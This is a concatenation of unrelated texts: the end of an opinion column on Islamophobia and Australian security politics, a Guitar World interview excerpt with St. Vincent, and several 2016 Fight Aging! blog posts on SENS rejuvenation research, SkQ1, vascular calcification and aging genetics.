'Team Australia', which implies a suspicion of those not perceived to be onboard Team Groupthink. When our political leaders fan the flames of division, vandals and Islamophobes almost get tacit approval - it sends a message that some citizens are worth more than others, and deserve our disapprobation.\n\nBeefed-up terrorism laws, graffitied mosques and cars, threatening letters and angry political rhetoric has made Muslim communities in all their diversity feel increasingly under siege, ironically fuelling the kind of alienation that sees young people fall into the arms of radicals.\n\nThe fact that street abuse and harassment has prompted communities to set up self-reporting mechanisms like Facebook's National Islamophobia Register, rather than go to police, is a testament to the level of distrust between minority communities and the authorities that are meant to protect all citizens.\n\nIn this climate, what arguments can Muslim community leaders use to sway young men who could fall victim to the siren call of radicalism, and those who use Muslim victimisation and discrimination as a rallying call to disengage?\n\nI am not saying the risk of terrorism in Australia isn't real. But the spectacle of the Federal Government's response to perceived threats - the rhetoric and ballast and heavy performance of power - risks sending people underground while alienating the very communities that could assist.\n\nThis performance around security points to a kind of politics of fear that is depressingly familiar in Australian politics, and is reminiscent of the Government's treatment of asylum seekers.\n\nThe best way to shore up an unpopular government is to summon up something else for voters to fear and hate, so that we can turn to daddy with gratitude for rescuing us. If this means trashing decades of goodwill built up in our pluralistic society and smashing a few civil liberties on the way, then so be it.\n\nSarah Malik is Sydney-based journalist and writer.

  "latent_22293": "(Image: © Travis Shinn)\n\nThe following excerpt is from the February 2017 issue of Guitar World.\n\nAnnie Clark is officially one step ahead of us. We've always suspected as much, but this fact was confirmed the moment she emerged from hair and makeup for her inaugural Guitar World cover shoot holding a guitar...and wearing a dress that featured a print of a bikini body, just like the kind you'd find hanging in the window of a kitschy beach shop.\n\nNow, a little background may be in order: For years, Guitar World published a one-off magazine, a buyer’s guide that featured—you guessed it—models posing with musical equipment. That mag may no longer be in production, but the internet remembers all and provided Clark with some ripe source material for her cover concept.\n\n“I did a quick Google search of women on the cover, and all I really saw was girls in bikinis holding guitars like they’ve never held a guitar before,” says Clark. “I started thinking about that and just wanted to make my own absurdist comment on it. I couldn’t really let it slide without poking a bit of fun and taking the piss a little!”\n\nClark’s sly comment on the magazine—literally on the cover of the magazine—is definitely a kick-ass meta move. But her disruption of the status quo doesn’t stop there. Performing as the enigmatic, experimental St. Vincent, she has become what might best be described as a postmodern guitar hero, and for the last decade has been subtly injecting some truly exciting guitar playing into the pop music landscape.\n\nIn broad strokes, the music of St. Vincent—heard on her five studio albums—is an expertly crafted blend of art rock, indie, jazz and progressive pop. Clark constructs songs in which haunting melodies, syncopated rhythms and dissonant chord progressions set the stage for her insightful observations of life in the digital age, which she delivers in a detached, yet surprisingly vulnerable, singing style.\n\nClark is an exacting songwriter whose deft guitar playing is put on display only when it’s in support of the song. But when the song calls for it—often at the most unexpected times—she can unleash a torrent of heavy grooving two-handed tapping or the kind of searing effect-laden solo that will send shivers up your spine. And for as cool and complex as her songs can be, Clark’s approach is also imbued with an endearing playfulness. So it’s not surprising that Dweezil Zappa has said young listeners looking for a pathway into his late father Frank’s quirky, far-out catalog should listen to St. Vincent.\n\nClark draws from an aptly diverse range of influences—from Robert Fripp, Steely Dan and Marc Ribot to Nick Cave, Nirvana and Dimebag Darrell—without mimicking any of them. Instead she’s created an inventive, sophisticated approach to contemporary guitar playing and composition and achieved what might be the principal goal for all guitar players: she’s found a unique voice. Like all noble pursuits, it took time (and a lot of woodshedding) to develop her style. That work began three decades ago under the wide-open Texas sky.\n\nAnnie Clark was born in Tulsa, Oklahoma, in 1982, but grew up outside of Dallas, Texas, which is where she first discovered her innate connection to the guitar.\n\n“Guitar was one of those things, those callings,” she says. “It just hit me. I would draw guitars, and make guitars, when I was five years old. I was completely obsessed with the shape. I loved it. I was in love with it even before I started to play it.”\n\nWhen she eventually picked up a guitar in her teens, Clark consumed a steady musical diet of grunge, rock and metal, as well as some jazz courtesy of her uncle, guitarist Tuck Andress of husband and wife jazz duo Tuck & Patti. The Andresses played a significant role in the young guitarist’s upbringing. Initially they offered her a sneak peek into the life of a touring musician when they brought her on for a stint as a roadie, and later, when she approached high-school graduation, they strongly urged her to further her musical education at the university level.\n\nClark recalls, “I remember very pointedly Tuck and Patti called and said, ‘She needs to be a musician. She should go to Berklee and get additional training.’ ”\n\nShe heeded their advice, and headed to Boston to begin coursework at the Berklee College of Music. Clark spent three years dutifully studying theory and performance at Berklee, but ultimately grew tired of the curriculum and dropped out. Following a brief layover in New York where she failed to gain traction in the music scene, the crestfallen guitarist made her way back to Texas.\n\n“Since I was a five-year-old kid I knew I was going to play music. I was just going to do it,” she says. “So when I had to move back home after dropping out of college it was depression that I had never felt in my life. Like, Oh, I’m a failure. This was not part of the plan.”\n\nBut her disillusionment was short lived. Not long after she returned to Texas, a friend who played with Dallas-based orchestral psych-pop group the Polyphonic Spree mentioned they were expanding their ranks, and got Clark an audition. She landed the gig, and was soon whisked away into the life of a touring musician.\n\n“I was on tour in Europe for a month, opening for Brian Wilson at the Hollywood Bowl, working in Pachyderm [Studios] where Nirvana recorded, and at Steve Albini’s place in Chicago,” she recalls. “I was in it. I was in the game, you know?”\n\nThe Polyphonic gig provided the jumpstart that Clark’s career needed, and kicked off a decade of an entirely different musical schooling on the road, which first saw her supporting indie artist Sufjan Stevens before she transitioned into near non-stop world touring as St. Vincent. In the last few years, Clark has surfaced all across the pop culture landscape: fronting the surviving members of Nirvana at the Rock and Roll Hall of Fame, performing with the Dallas Symphony Orchestra, making a rocking guest appearance at a Taylor Swift gig, covering “The Star-Spangled Banner” for an NFL promo spot, cutting a record with Eighties art punk David Byrne, performing at the behest of David Lynch at the director’s Festival of Disruption and appearing onstage at the Grammys to collect the Best Alternative Album award for 2014’s St. Vincent.\n\nIn 2015 she also found the time to conceive and develop a signature guitar, which debuted as the Ernie Ball Music Man St. Vincent model at the 2016 NAMM tradeshow. The St. Vincent six-string—which boasts a unique, asymmetrical body shape, custom St. Vincent Music Man Modern tremolo, all-rosewood neck and three DiMarzio custom mini humbuckers—has become one of the brand’s best-selling guitars, and has inspired a who’s-who of taste-making artists, including Beck, Dave Grohl, Josh Homme and Taylor Swift, to request St. Vincent models from Ernie Ball.\n\nThe success of the launch, coupled with the personal connection she’s developed with the Ernie Ball team, has Clark excited to explore future gear collaborations with the company. “Well, Sterling [Ball] is like my third father,” she says, with a laugh, of the company’s CEO. “They’re a family company and they’ve made me part of the family. So as far as I’m concerned I’m a lifer.”\n\nBut at the moment Clark’s primary focus is on completing the follow-up to St. Vincent. The process for recording the new as-yet-untitled album (which is due for release this spring) has been more drawn out than past efforts, but has produced what she describes as a “real sea change” in her sound.\n\n“I’ve been able to step back and reflect and not just be in the tour, record, tour, record cycle that I’ve been in for about 10 years,” says Clark. “I think it’ll be the deepest, boldest work I’ve ever done. I feel the playing field is really open for creative people to do whatever you want, and that risk will be rewarded—especially now that we have such high stakes from a political and geo-political standpoint. The personal is political and therefore the political can’t help but influence the art. And only music that has something pretty real to say is gonna cut the mustard.”\n\nFor the following interview, we meet Clark at the Ivory on Sunset, a small restaurant discretely tucked beneath the chic Mondrian Hotel in West Hollywood. Over a beer and a cappuccino (“My perfect combination. I don’t like drug drugs, so coffee’s my best upper.”), the guitarist reflects on the roads she’s traveled and reveals where she’s headed in 2017.\n\nFirst things first, I gotta ask: How was that recent gig at David Lynch’s Festival of Disruption? That looked like a wild night.\n\nI wanted to do something particularly special, a new kind of performance piece, as pretentious as that sounds. [laughs] I had these dancers who I’ve worked with before, and they dressed as weird blonde twins and did this postmodern version of the Blue Velvet scene with Dennis Hopper and Isabella Rossellini, the one with the oxygen mask. It was so fun!\n\nLynch’s work, both musical and cinematic, speaks to left-of-center thinkers. You grew up in Dallas, which is pretty conservative. Was it a struggle to find likeminded musical weirdos?\n\nMusic has always been the key. I was really shy and nervous growing up. But I had like a “put me in coach” mentality with music. The thing that’s so great about it is that you meet all manner of different people playing music. The first band I played in was a metal band with junior high guys.\n\nOh nice. What kind of stuff were you playing?\n\nIt was Maiden, Megadeth, Metallica, Rage [Against the Machine] and AC/DC covers, and I played an iridescent purple Ibanez bass. Because when you’re 13 there’s a circle of people who all play music…but no one wants to play bass! [laughs] Everyone wants to be the lead guitar player. But I just wanted to play.\n\nTo read the rest of our interview with St. Vincent, pick up the February 2017 issue of Guitar World now.",

Cancer is just as much a part of aging that must be ended, brought completely under control, as all of the other line items in the SENS rejuvenation research portfolio, and this year is the first time that the SENS Research Foundation has run a fundraiser for this program.\n\nHopefully there is no need to remind the audience here that the SENS Research Foundation, and important ally the Methuselah Foundation, have in recent years achieved great progress in the field of rejuvenation research on the basis of our donations and our support. Some of the high points you'll find mentioned here and there at Fight Aging!: support and ongoing expansion of the mitochondrial repair technologies now under development at Gensight; seed funding Oisin Biotechnologies for senescent cell clearance; unblocking efforts to clear glucosepane cross-links that stiffen tissues; running the lauded Rejuvenation Biotechnology conferences; and many more. If only all charities produced as great an impact with as few resources - and if only we were further along in the bootstrapping of an industry focused on the development of rejuvenation therapies. But we are where we are, and it remains wholly our opportunity as grassroots activists to light the way for others, to point out the research programs most likely to produce great gains in human health and longevity, and to attract a larger community of supporters to help out. They will be drawn by the fact we are a growing crowd, and that we have declared our support and expectation of good results from these programs: from senescent cell destruction, from mitochondrial repair, from glucosepane cross-link clearance, and from the others of the SENS program.\n\nThese SENS rejuvenation biotechnologies are unified by the theme of picking out specific areas of research that have been or are presently largely ignored, but that are also essential to the production of enormously beneficial outcomes in medicine, great leaps ahead rather than the incremental plodding that is the more usual state of medical progress. We live in an era of enormously rapid progress in biotechnology, and our medicine should reflect that fact - but in all too much of the research community there is a decided lack of ambition, and a culture that prefers to inch forward by increments. The entire point of the SENS vision, and the activities of the SENS Research Foundation and its allies, is to demonstrate that timidity and incrementalism can be bypassed to the benefit of all. There are large gains in health out there to be had, if the right strategy is chosen for research and development.\n\nWhen it comes to the matter of aging that strategy is to focus on repairing the fundamental biomolecular damage of aging, the well-cataloged changes that distinguish old tissues from young tissues, and which have no other cause beyond the normal operation of healthy metabolism. These are forms of biological wear and tear, if you like, the accumulation of waste products and tiny breakages that spiral out into dysfunction and organ failure. For cancer research, meanwhile, the situation is more akin to an economic revolution, or disruptive advance in technology. Because all cancers must lengthen their telomeres, and because telomere lengthening is governed by a small number of processes, there is the opportunity to change the focus of cancer research from an endless procession of expensive new therapies, each targeting a tiny number of the hundreds of subtypes of cancer, to one single therapy that can effectively suppress all cancers. That is a huge difference, and turns the complete medical control of cancer from a distant future prospect into something that might be achieved from start to finish in a few decades.\n\nThe SENS Research Foundation's contribution to this project, the work that we as philanthropists choose to fund, is to run an assay with new tools against the standard drug library to find candidates to suppress alternative lengthening of telomeres (ALT). This should lead to a better understanding of how to build very effective therapies for ALT cancers, and in the best scenario will produce the starting point for a first wave of general therapies that can be applied to these cancers within a few years from discovery, based on repurposing known drugs. Other research groups are working on suppressing telomere lengthening by blocking telomerase, but it is becoming increasingly clear that telomerase cancers are quite capable of switching to become ALT cancers if provoked. The effectiveness of this road towards a universal cancer treatment depends on the blockade of both ALT and telomerase, but next to no-one has been working on ALT. This is where the SENS Research Foundation scientists, supported by you and I, can do their part to make this new approach to cancer a reality, by picking up this neglected but vital line of research and making the same success of it as they have in other areas.\n\nHow to make this happen? All we have to do is donate, mention this to our friends, say something to the world about how important it is that the whole of cancer research be transformed in this way. It is a golden opportunity to do something here and now to help build the type of future that we want to see.\n\nConsidering Age Reversal Therapeutics\n\nhttps://www.fightaging.org/archives/2016/09/considering-age-reversal-therapeutics/\n\nAge Reversal Therapeutics is an initiative launched by quite the varied set of people: leaders from the \"anti-aging\" marketplace's Life Extension Foundation, a SENS Research Foundation researcher, a selection of biotech industry veterans, a practitioner of anti-aging medicine, and a reputable genetics researcher quite well known in our community. Strange bedfellows indeed - a meeting of many houses of the broader community interested in aging, houses that typically don't have much to do with one another, and indeed in some cases don't think much of one another. The basic plan here is to raise money from investors and then put it into some of the most promising of recent research and development initiatives in the treatment of aging. It is intended to be one of those hybrids that is something like a company and something like an investment fund. You can read their plans in some detail in their large PDF prospectus; scroll all the way down past the legal and fiscal matters to page 124 for the discussion of what exactly they intend to fund and the overall goals of the venture.\n\nIt is my belief that over the long term the currently terrible \"anti-aging\" marketplace will see the useless pills, creams, supplements, and potions replaced by rejuvenation technologies that actually work - as those technologies emerge from the scientific community, that is. The \"anti-aging\" marketplace always was, to a very large degree, a pipeline established by earnest believers in the end goal of extending healthy life spans, but who were unfortunate enough to have found that calling well in advance of the existence of any way to meaningfully alter the course of aging. Having the heart in the right place doesn't excuse what came next, of course, in which any old junk was thrust into the market in order to make money from the credulous, and thanks to the megaphone of marketing the whole concept of intervening in the aging process became synonymous in many eyes with rampant fraud over the course of the last few decades of the last century. This history does explain why some of the notable companies in the space, such as the supplement seller Life Extension Foundation, do in fact devote funding to legitimate research that you and I might approve of: stem cell trials, SENS programs, cryopreservation technology, targeted cancer therapies, and the like.\n\nAge Reversal Therapeutics represents one of a number of possible next steps beyond those activities, now that the environment and awareness of aging as a therapeutic target has advanced to the point at which the rejuvenation therapy of senescent cell clearance is under development in startups, Calico Labs and Human Longevity have raised large sums, and other efforts make it clear that there is money out there for meaningful commercial work on the problem of aging. The question is how to take this new enthusiasm among for-profit investors and turn it into the research funding still needed to push new rejuvenation therapies to the point of commercial viability. Years of work and millions in fundraising yet remain to be accomplished to reach that point in most cases. The SENS Research Foundation has launched Project|21 as one possible answer to this question. Age Reversal Therapeutics is another possible answer. There are other groups out there taking the more traditional paths of establishing venture funds or starting their own companies. Old habits die hard, sad to say, and most investors are not yet willing to abandon profit as the primary marker of success, when the only real measure of success is future health and longevity. What use is financial profit to those crippled by age, who cannot buy the only thing they really want?\n\nI think the next ten to twenty years of transition in the \"anti-aging\" marketplace from junk and outright lies to therapies that work is going to be messy for any poorly educated consumer. For people like me it will be increasingly hard to draw good lines between good and bad initiatives. We are absolutely going to see clinics marketed as anti-aging salons selling fully functional senescent cell clearance treatments in a package with entirely useless apple stem cell facial scrubs, and making little effort to educate their customers as to where the benefit comes from. We will eventually see clinics selling packages wherein, unlike the obvious example above, I cannot make a good judgement call as to which components are worth the candle. The glass half full view is that this will be much better than the present situation. An \"anti-aging\" marketplace in which only 10% of the products actually work is still 10% better than what we have today. So to the degree that the Age Reversal Therapeutics principals find new sources of significant investment from the Life Extension Foundation sphere of influence, then go on to fund projects that I agree with, and note that rejuvenation of the thymus is on their list, for example, and further manage to push the results into clinics for medical tourism and trials for validation, then I'm all in favor of the mess that lies ahead. It will certainly beat the present mess, featuring as it does a complete lack of ways to effectively treat aging as a medical condition.\n\nBut I encourage you to explore the Age Reversal Therapeutics website and form your own opinions. Certainly there is always the lingering suspicion that a venture led by the Life Extension Foundation and other \"anti-aging\" marketplace principals will go on to fund projects that I would characterize as useless at best and objectionable at worst. We shall see. I choose to be cautiously optimistic, and believe that, if the funding can be found, this has the potential to become something that looks a lot like the Life Extension Foundation's research funding program shorn of the Life Extension Foundation itself.\n\nMitotech and Clinical Progress for Mitochondrially Targeted Antioxidants\n\nhttps://www.fightaging.org/archives/2016/09/mitotech-and-clinical-progress-for-mitochondrially-targeted-antioxidants/\n\nThe path from laboratory to clinic is a lengthy one. It helps to keep an eye on specific projects across the years to better calibrate one's expectations for new lines of research. Today's example of the mitochondrially targeted antioxidant molecule SkQ1, a form of plastiquinone, has been under development for quite the long time, starting with Russian lab work that first attracted my notice ten years ago - and of course had been going on for quite some time prior to that, stuck on the wrong side of the language barrier to catch the best opportunities for investment and interest. Following years of animal studies of various sorts, SkQ1 is presently being brought to the clinic by the European company Mitotech. They are in the midst of a human trial for dry eye syndrome and have recently obtained a patent in the US:\n\nMitotech S.A., a Luxembourg based clinical stage biotechnology company focused on age-related disorders, announced that it received a U.S. patent covering deceleration of aging in living organisms by its lead compound SkQ1. \"The main aspect of the mechanism of action of our lead compound is protecting mitochondria from oxidative stress, which is a confirmed key factor in cell aging. That's one of the reasons SkQ1 proved to be effective in a wide spectrum of models of age-related disorders. This particular patent, however, may pave the way for Mitotech to pursue aging as a standalone indication. Of course, that would be a major undertaking in terms of the volume of clinical development and regulatory work, but we think it's an attractive opportunity and the field is wide open for a break-through technology.\"\n\nMitotech S.A. is granted a patent in anti-aging\n\nOne of the more intriguing outcomes of targeted mitochondrial antioxidant research is that it has shown promise as a treatment for a number of quite different eye conditions, such as cataracts, glaucoma, and dry eye syndrome. That is the path that was eventually chosen for initial commercial development. Dry eye syndrome is not to be dismissed lightly; ask anyone unfortunate enough to have suffered it. It is quite prevalent in old age and produces an negative impact on quality of life far larger than one might imagine would result from the tiny systems failures that cause the condition. That said, the reason that this community is interested in mitochondrially targeted antioxidants is because of the possibility that they can slow one of the forms of damage that contributes to degenerative aging, within which dry eye syndrome is but the tiniest mote.\n\nAs for any discussion of mitochondrially targeted antioxidants such as plastiquinones, SS-31, and MitoQ, it is worth taking a moment to point out that they are very different from the common or garden antioxidants that you can buy in the store. It is generally accepted in the research community that taking general antioxidant supplements is modestly harmful over the long term. In animal studies it tends to reduce life span by a modest amount. One of the mechanisms by which this might occur is that antioxidants will intercept and suppress the excess reactive oxygen species generated during exercise. That excess is a signal, and spurs a range of activities that result in everything from additional cellular maintenance to muscle repair and growth. This is something to bear in mind. Mitochondrially targeted antioxidants, on the other hand, localize to the mitochondria in cells. They primarily soak up reactive molecules there, not generally throughout tissues. This produces a range of effects because mitochondria are of great importance to cellular metabolism, and also of great importance in the aging process.\n\nThere are a couple of things going on for mitochondria in aging. The one that is the subject of more research is a downstream result of the many forms of molecular damage in aging, in which mitochondrial operation in cells declines in general, and tissues suffer as a result. This is a very complex and still poorly understood situation governed by epigenetics and scores of related, interdependent reactions to the low-level damage of aging, and which varies widely between tissue types and individuals. The less well researched issue is that mitochondria suffer damage to their DNA, separate from that of the cell nucleus. If genes essential to normal mitochondrial operation are deleted or damaged as a result, then the mutant mitochondria can either replicate more rapidly or become more resistant to quality control than their undamaged peers - it isn't clear which is the case at this point. Regardless, such mutants quickly take over cells and run rampant, turning these host cells into damaging exporters of reactive molecules that can cause all sort of harm in tissues both near and far. How does this DNA damage come about? It might be breakage during replication, but the consensus candidate has long been the generation of reactive oxygen species that happens inside mitochondria, right next door to their vulnerable DNA. Experiments with increased levels of natural mitochondrial antioxidants such as catalase provide supporting evidence for this proposition. Delivering artificial mitochondrially targeted antioxidants is thought to reduce the pace of mutational damage, and thus modestly improve healthy life span in this way.\n\nGiven the complexity of mitochondrial biochemistry, and its influential role on metabolism as a whole, I should say that almost everything I've said above has been disputed by one or more research groups at some point in time. The consensus is of varied resilience and always under attack. When it comes to the effects of mitochondrially targeted antioxidants on various medical conditions, their relevance may be as much damping down some of the oxidative signaling produced by mitochondria in inflamed tissues, or protecting mitochondria from an influx of oxidative molecules arriving from elsewhere, as anything else. This seems to help slow progression of a number of diseases with inflammatory components, as inflammation and oxidative stress go hand in hand. For all the focus on aging in the materials on SkQ1, the more rigorous life span studies of SkQ1 show only modest extension of life in short-lived animals, such as the recent demonstration of 10% life extension in flies. This is really not large enough to make it something that I'd consider worth chasing as an intervention in aging; short-lived species have very plastic life spans, and a 10% gain in flies is small in comparison to, say, the outcomes for calorie restriction. Get out there and exercise more and eat less, and you'll probably be doing more for your long-term health. If, however, as seems to be the case, these targeted antioxidants can have a significant positive impact on the later stages of a fair number of different age-related diseases that involve raised levels of oxidative stress and inflammation, well, then that was still research and development time well spent, even if it wasn't the outcome hoped for.\n\nA Cellular Cause for Calcification of Blood Vessels\n\nhttps://www.fightaging.org/archives/2016/09/a-cellular-cause-for-calcification-of-blood-vessels/\n\nThe publicity materials and paper linked below discuss the identification of a cell type and related mechanisms responsible for calcification of blood vessels. The focus is on the environment of kidney disease, and thus on kidney tissue, but we might hope that this has a broader relevance to the age-related calcification that occurs in all blood vessels over the years. The more that is known of blood vessel calcification, the better the odds that something might be done about it soon enough to matter for you and I. The deposition of calcium in blood vessel walls is considered to be an important contribution to the loss of elasticity in these tissues. The stiffening of blood vessels with age drives the development of hypertension, an increase in blood pressure. Hypertension and stiffening cause detrimental remodeling of heart tissue that leads towards heart failure, as well as ever greater breakage of tiny blood vessels, such as in the brain, where the resulting tissue damage produces cognitive decline. Most forms of age-related cardiovascular dysfunction are exacerbated by hypertension: the higher the blood pressure, the worse the long-term prognosis.\n\nWhile calcification in blood vessels is universally agreed to be a bad thing for the reasons given above, it is one of the many age-related changes for which there is no robustly defended line that can be drawn, leading through clearly demarcated steps, starting from an increase in fundamental forms of cell and tissue damage, the wear and tear caused by the normal operation of our biology, and ending with an increase in calcification. There is, however, a fair amount of evidence that can be used to argue over whether or not calcification is itself a fundamental form of damage, whether or not it is secondary to other forms of damage and change, and the nature of the processes that cause it. For example, calcification may be made worse by the presence of metabolic waste, of a type that the SENS Research Foundation has worked on clearing. It is also argued to be made worse by inflammation and by destruction of elastin, the basis for tissue elasticity. Sedentary individuals exhibit more calcification, as do those who report more time spent sitting.\n\nThe best path to deal with calcification depends on whether or not it is a fundamental form of damage. If it is a downstream effect of the classes of molecular damage outlined in the SENS vision for rejuvenation therapies, then the fix for calcification, as for near all aspects of aging, is to build those therapies, capable of repairing the root cause molecular damage. If calcification has a cellular cause, in that specific types of cells are changing their behavior in increasing numbers to deposit calcium where they should not be depositing calcium, then that scenario makes it much more likely that this is a secondary or later effect of other molecular damage. This unwanted change in cell behavior has been seen by other researchers in recent years, in heart tissue, for example. Separately, various therapeutic approaches based on removing the calcium deposits have been suggested by research groups over the years. It is likely that these approaches would be needed in addition to damage repair for people who have already grown old; simply repairing other forms of damage may not lead to the removal of excess calcium that has already accumulated. On this front it has been suggested to make use of osteoclasts, the cells responsible for dismantling bone, or, more conventionally, some form of chelation.\n\nScientists find culprit responsible for calcified blood vessels in kidney disease\n\nScientists have implicated a type of stem cell in the calcification of blood vessels that is common in patients with chronic kidney disease. The research will guide future studies into ways to block minerals from building up inside blood vessels and exacerbating atherosclerosis, the hardening of the arteries. \"In the past, this calcification process was viewed as passive - just mineral deposits that stick to the walls of vessels, like minerals sticking to the walls of water pipes. More recently, we've learned that calcification is an active process directed by cells. But there has been a lot of controversy over which cells are responsible and where they come from.\" The cells implicated in clogging up blood vessels with mineral deposits live in the outer layer of arteries and are called Gli1 positive stem cells. They have the potential to become different types of connective tissues, including smooth muscle, fat and bone. In healthy conditions, Gli1 cells play an important role in healing damaged blood vessels by becoming new smooth muscle cells, which give arteries their ability to contract. But with chronic kidney disease, these cells likely receive confusing signals and instead become a type of bone-building cell called an osteoblast, which is responsible for depositing calcium. \"We expect to find osteoblasts in bone, not blood vessels. During kidney failure, blood pressure is high and toxins build up in the blood, promoting inflammation. These cells may be trying to perform their healing role in responding to injury signals, but the toxic, inflammatory environment somehow misguides them into the wrong cell type. We found Gli1 cells in the the calcified aortas of patients in exactly the same place we see these cells in mice. This is evidence that the mice are an accurate model of the disease in people.\" Further supporting the argument that Gli1 cells are driving the calcification process, the researchers showed that removing these cells from adult mice prevented the formation of calcium in their blood vessels. \"A drug that works against these cells could be a new therapeutic way to treat vascular calcification, a major killer of patients with kidney disease. But we have to be careful because we believe these cells also play a role in healing injured smooth muscle in blood vessels, which we don't want to interfere with.\"\n\nAdventitial MSC-like Cells Are Progenitors of Vascular Smooth Muscle Cells and Drive Vascular Calcification in Chronic Kidney Disease\n\nMesenchymal stem cell (MSC)-like cells reside in the vascular wall, but their role in vascular regeneration and disease is poorly understood. Here, we show that Gli1+ cells located in the arterial adventitia are progenitors of vascular smooth muscle cells and contribute to neointima formation and repair after acute injury to the femoral artery. Genetic fate tracing indicates that adventitial Gli1+ MSC-like cells migrate into the media and neointima during atherosclerosis and arteriosclerosis in ApoE-/- mice with chronic kidney disease. Our data indicate that Gli1+ cells are a major source of osteoblast-like cells during calcification in the media and intima. Genetic ablation of Gli1+ cells before induction of kidney injury dramatically reduced the severity of vascular calcification. These findings implicate Gli1+ cells as critical adventitial progenitors in vascular remodeling after acute and during chronic injury and suggest that they may be relevant therapeutic targets for mitigation of vascular calcification.\n\nYet More Genetic Mapping of Degenerative Aging\n\nhttps://www.fightaging.org/archives/2016/09/yet-more-genetic-mapping-of-degenerative-aging/\n\nToday I'll point out a two open access papers on the mapping of genetics, epigenetics, aging, and age-related disease. There is a lot of this sort of work taking place these days: it is ever easier to raise funding for any sort of work on genetics, and this is the beginning of the age of practical gene therapy. Intervening in the aging process to slow or reverse aging, as opposed to trying to patch over the late stage consequences of specific age-related diseases without actually touching the processes of aging itself, remains a comparatively small initiative within the aging research community. Most funded work on aging goes towards cataloging and mapping, a part of the great life science initiative to produce a comprehensive atlas of living biology from top to bottom: how our cells and tissues work, and how every function of every biological system changes over time, understood all the way down to the roles of individual molecular interactions. This is an enormous project, staggering in scope, with the present vast databases of molecular biochemistry just a sketch of the outline of the whole when held up against the bigger picture. Barring revolutionary advances in automation and computation this project will be nowhere near complete even several decades from now.\n\nTo the extent that factions within the scientific community prioritize complete understanding of aging above interventions in aging based on what we do already know, they have decided that no significant progress on lengthening life will be made in our lifetimes. If this view dominates, the future will be much the same as the recent past, in that the steady upward slope of small gains in adult life expectancy will continue, with the bulk of these benefits arising from incidental side-effects of the standard medical approach to late-stage aging and age-related disease. The patches will get better, but a patched and damaged system still fails; the patch can only delay the inevitable. The most important debate in medical research today is between those who prioritize full understanding and slow progress towards slowing aging versus those who want to take the current catalog of known differences between old and young tissue and fix them in advance of full understanding. That will cost a lot less and achieve answers on the relevance of this damage to aging and rejuvenation far more rapidly than any other methodology.\n\nUnfortunately, gathering greater support and adoption of work on biological repair and rejuvenation is still an uphill battle, despite successes in the making such as senescent cell clearance, an approach gathering more attention these days. The majority of research into aging looks a lot more like the open access papers linked here, which is to say it is interesting, largely focused on genetics, generates a lot of data, and is of little practical use in the near term. Altering gene expression levels in the hopes of improving the situation for older people is somewhat like adjusting the fuel balance of a rusted and worn engine in the hopes that it will run a little longer. It misses the point, the direct and most useful thing that could be done to improve matters. The grand map of molecular biochemistry is absolutely something that should be constructed, and will be of great use to the next generation of biotechnologies - but to focus on that entirely is to sacrifice countless lives, when the research and development community could also be building the first generation of therapies that will help bring an end to degeneration aging.\n\nDiscover the network mechanisms underlying the connections between aging and age-related diseases\n\nAlthough our knowledge of aging has greatly expanded in the past decades, it remains elusive why and how aging contributes to the development of age-related diseases (ARDs). In particular, a global mechanistic understanding of the connections between aging and ARDs is yet to be established. We rely on a network modelling named \"GeroNet\" to study the connections between aging and more than a hundred diseases. By evaluating topological connections between aging genes and disease genes in over three thousand subnetworks corresponding to various biological processes, we show that aging has stronger connections with ARD genes compared to non-ARD genes in subnetworks corresponding to \"response to decreased oxygen levels\", \"insulin signalling pathway\", \"cell cycle\", etc. Based on subnetwork connectivity, we can correctly \"predict\" if a disease is age-related and prioritize the biological processes that are involved in connecting to multiple ARDs. Using Alzheimer's disease (AD) as an example, GeroNet identifies meaningful genes that may play key roles in connecting aging and ARDs. The top modules identified by GeroNet in AD significantly overlap with modules identified from a large scale AD brain gene expression experiment, supporting that GeroNet indeed reveals the underlying biological processes involved in the disease.\n\nSystematic analysis of the gerontome reveals links between aging and age-related diseases (full text is PDF only)\n\nIn model organisms, over 2,000 genes have been shown to modulate aging, the collection of which we call the \"gerontome\". Although some individual aging-related genes have been the subject of intense scrutiny, their analysis as a whole has been limited. In particular, the genetic interaction of aging and age-related pathologies remains a subject of debate. In this work, we perform a systematic analysis of the gerontome across species, including human aging-related genes. First, by classifying aging-related genes as pro- or anti-longevity, we define distinct pathways and genes that modulate aging in different ways. Our subsequent comparison of aging-related genes with age-related disease (ARD) genes reveals species-specific effects with strong overlaps between aging and age-related diseases in mice, yet surprisingly few overlaps in lower model organisms. We discover that genetic links between aging and age-related diseases are due to a small fraction of aging-related genes which also tend to have a high network connectivity. Other insights from our systematic analysis include assessing how using datasets with genes more or less studied than average may result in biases, showing that age-related disease genes have faster molecular evolution rates and predicting new aging-related drugs based on drug-gene interaction data. Overall, this is the largest systems-level analysis of the genetics of aging to date and the first to discriminate anti- and pro-longevity genes, revealing new insights on aging-related genes as a whole and their interactions with age-related diseases. We first characterized functions and pathways overrepresented in pro- and anti-longevity genes. Major anti-longevity pathways and processes include insulin signaling, growth hormone signaling and mTOR signaling. Key pro-longevity pathways include p53, cell cycle and autophagy. Although such pathways and processes are known to be related to aging, it is interesting that they are classified as anti-and pro-longevity in our systematic analysis of the genetics of aging. Differentiation between anti-longevity and pro-longevity genes and processes can provide additional clues about aging-related processes and can help identify other genes with a similar effect on aging. In order to find relations between aging and ARD, we compared aging-related gene sets with ARD genes. Limitations of our study include the fact that possibly many genes associated with longevity and disease remain to be identified, and the causal genes in many genetic associations with disease are still unknown. In spite of these caveats, our results show an association between aging and ARDs at the genetic level, although this is surprisingly species-specific with a stronger overlap in mice than in invertebrates (flies and worms) and practically no overlap in yeast. The overlap analyses of anti- and pro-longevity genes shows differences in musculoskeletal, nervous system and cardiovascular diseases. The identified overlaps suggest that the musculoskeletal and nervous systems are related to pro-longevity genes while anti-longevity genes seem more associated with cardiovascular diseases. Looking at ARD classes which overlap with human aging-related genes, a significant overlap is verified for all classes as expected, except for immune system diseases. The nutritional and metabolic diseases, the neoplasms, the cardiovascular diseases and the nervous system diseases have the most significant overlap with human aging-related genes. Eye diseases, respiratory tract diseases (which we considered a negative control) and immune system diseases had the least overlap, but it is important to mention that these are (together with musculoskeletal diseases) the age-related disease classes with fewer genes. The main conclusion from this work is that aging and age-related diseases are related and share more genes than expected by chance. Human aging-related genes showed a considerable overlap with ARDs. These overlaps are driven by a small subset of aging-related genes which are associated with various age-related diseases and are hubs in networks. Besides, the extent of overlaps decreases with the increase of evolutionary distance, and yeast aging-related genes show practically no overlap with ARDs. Novel differences in overlapping age-related disease classes between anti- and pro-longevity genes were observed: Nervous system and musculoskeletal diseases seem more associated with pro-longevity, while cardiovascular diseases have a stronger association with anti-longevity genes. 